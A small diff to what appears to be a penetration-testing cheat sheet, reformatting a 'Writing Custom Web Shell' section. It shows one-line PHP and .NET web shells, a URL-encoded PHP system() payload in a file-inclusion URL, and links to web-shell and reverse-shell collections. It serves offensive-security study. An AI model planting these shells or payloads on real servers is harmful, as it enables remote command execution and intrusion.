@@ -629,8 +629,8 @@ http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22c
 - [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
 
 ## Writing Custom Web Shell
-PHP : ```<?php system($_REQUEST['cmd']); ?>```<br/>
-.NET : ```<% eval request('cmd') %>```
+- PHP : ```<?php system($_REQUEST['cmd']); ?>```<br/>
+- .NET : ```<% eval request('cmd') %>```
 
 ## Reverse Shell
 - [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
